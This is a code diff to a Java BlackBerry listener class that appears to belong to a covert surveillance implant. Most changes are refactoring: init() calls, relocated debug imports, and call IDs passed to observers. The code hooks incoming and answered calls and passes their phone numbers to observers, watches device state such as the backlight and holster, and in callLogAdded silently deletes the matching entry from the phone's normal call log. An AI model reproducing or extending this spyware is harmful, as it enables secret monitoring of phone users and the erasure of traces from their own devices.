@@ -45,6 +45,9 @@ import net.rim.device.api.ui.MenuItem;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.component.Menu;
 import blackberry.agent.SnapShotAgent;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
+import blackberry.fs.Path;
 import blackberry.interfaces.ApplicationListObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.BatteryStatusObserver;
@@ -54,8 +57,6 @@ import blackberry.interfaces.PhoneCallObserver;
 import blackberry.interfaces.Singleton;
 import blackberry.record.CameraRecorder;
 import blackberry.utils.Check;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -243,6 +244,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
      * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
      */
     public synchronized void batteryStatusChange(final int status) {
+        init();
+
         //#ifdef DEBUG_INFO
         debug.info("batteryStatusChange arg: " + status);
         //#endif
@@ -312,6 +315,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
      * @see net.rim.device.api.system.HolsterListener#inHolster()
      */
     public void inHolster() {
+        init();
+
         //#ifdef DEBUG_INFO
         debug.info("inHolster");
         //#endif
@@ -323,6 +328,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
      * @see net.rim.device.api.system.HolsterListener#outOfHolster()
      */
     public void outOfHolster() {
+        init();
+
         //#ifdef DEBUG_INFO
         debug.info("outOfHolster");
         //#endif
@@ -336,6 +343,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
      * )
      */
     public void networkScanComplete(final boolean success) {
+        init();
+
         //#ifdef DEBUG_INFO
         debug.info("networkScanComplete success: " + success);
         //#endif
@@ -435,6 +444,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
      * net.rim.device.api.system.SystemListener2#backlightStateChange(boolean)
      */
     public void backlightStateChange(final boolean on) {
+        init();
+
         //#ifdef DEBUG_INFO
         debug.info("backlightStateChange: " + on);
         //#endif
@@ -450,7 +461,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
 
             observer.onBacklightChange(on);
         }
-       
+
         if (on) {
             // riprende l'analisi degli applicativi
             // se c'e' una variazione nella lista comunica la lista agli observer
@@ -460,7 +471,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
             // interrompe l'analisi degli applicativi
             task.suspendApplicationTimer();
         }
-        
+
         // Verifica dei timers di task
         Task.getInstance().verifyTimers();
     }
@@ -582,6 +593,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
     }
 
     public void callIncoming(int callId) {
+        init();
+
         //#ifdef DEBUG_INFO
         debug.info("callIncoming: " + callId);
         //#endif
@@ -600,13 +613,15 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                 debug.trace("notify: " + observer);
                 //#endif
 
-                observer.onCallIncoming(phoneNumber);
+                observer.onCallIncoming(callId, phoneNumber);
             }
         }
 
     }
 
     public void callConnected(int callId) {
+        init();
+
         //#ifdef DEBUG_INFO
         debug.info("callConnected: " + callId);
         //#endif
@@ -625,19 +640,21 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                 debug.trace("notify: " + observer);
                 //#endif
 
-                observer.onCallConnected(phoneNumber);
+                observer.onCallConnected(callId, phoneNumber);
             }
         }
 
     }
 
     public void callAnswered(int callId) {
+        init();
+
         //#ifdef DEBUG_INFO
         debug.info("callAnswered: " + callId);
         //#endif
 
         PhoneCall phoneCall = Phone.getCall(callId);
-        String phoneNumber = phoneCall.getDisplayPhoneNumber();
+        String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
         boolean outgoing = phoneCall.isOutgoing();
 
         if (!outgoing) {
@@ -650,24 +667,32 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                 debug.trace("notify: " + observer);
                 //#endif
 
-                observer.onCallAnswered(phoneNumber);
+                observer.onCallAnswered(callId, phoneNumber);
             }
         }
 
     }
 
     public void callDisconnected(int callId) {
+        init();
+        boolean outgoing = false;
         //#ifdef DEBUG_INFO
         debug.info("callDisconnected: " + callId);
         //#endif
 
         PhoneCall phoneCall = Phone.getCall(callId);
-        if (phoneCall == null) {
-            return;
-        }
+        String phoneNumber = null;
+        
+        if (phoneCall != null) {
 
-        String phoneNumber = phoneCall.getDisplayPhoneNumber();
-        boolean outgoing = phoneCall.isOutgoing();
+            phoneNumber = phoneCall.getDisplayPhoneNumber();
+            outgoing = phoneCall.isOutgoing();
+
+        } else {
+            //#ifdef DEBUG_TRACE
+            debug.trace("callDisconnected: null phoneCall");
+            //#endif
+        }
 
         if (!outgoing) {
             final int size = phoneCallObservers.size();
@@ -679,12 +704,14 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                 debug.trace("notify: " + observer);
                 //#endif
 
-                observer.onCallDisconnected(phoneNumber);
+                observer.onCallDisconnected(callId, phoneNumber);
             }
         }
     }
 
     public void callLogAdded(CallLog callLog) {
+        init();
+
         String notes = callLog.getNotes();
         //#ifdef DEBUG_TRACE
         debug.trace("callLogAdded: " + callLog.toString() + " notes: " + notes);
@@ -696,18 +723,19 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
             PhoneCallLog phoneCallLog = (PhoneCallLog) callLog;
             PhoneCallLogID logID = phoneCallLog.getParticipant();
             //#ifdef DEBUG_TRACE
-            debug.trace("date: " + callLog.getDate() + " number: "
-                    + logID.getNumber());
+            //debug.trace("date: " + callLog.getDate() + " number: "
+            //        + logID.getNumber());
             //#endif 
         }
 
         int num = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
         for (int i = 0; i < num; i++) {
             CallLog log = phoneLogs.callAt(i, PhoneLogs.FOLDER_NORMAL_CALLS);
-            //#ifdef DEBUG_TRACE
-            debug.trace("date: " + log.getDate());
-            //#endif 
+
             if (callLog.getDate().getTime() == log.getDate().getTime()) {
+                //#ifdef DEBUG_TRACE
+                debug.trace("deleting date: " + log.getDate());
+                //#endif 
                 phoneLogs.deleteCall(i, PhoneLogs.FOLDER_NORMAL_CALLS);
                 break;
             }
@@ -715,12 +743,14 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
 
         int newnum = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
         //#ifdef DEBUG_TRACE
-        debug.trace("num: " + num + " after delete:" + newnum);
+        //debug.trace("num: " + num + " after delete:" + newnum);
         //#endif
 
     }
 
     public void callLogRemoved(CallLog arg0) {
+        init();
+
         //#ifdef DEBUG_TRACE
         debug.trace("callLogRemoved: " + arg0.getDate());
         //#endif
@@ -733,7 +763,13 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
 
     public void reset() {
         // TODO Auto-generated method stub
+    }
 
+    private synchronized void init() {
+        if (!Path.isInizialized()) {
+            Path.makeDirs();
+        }
+        Debug.init();
     }
 
 }
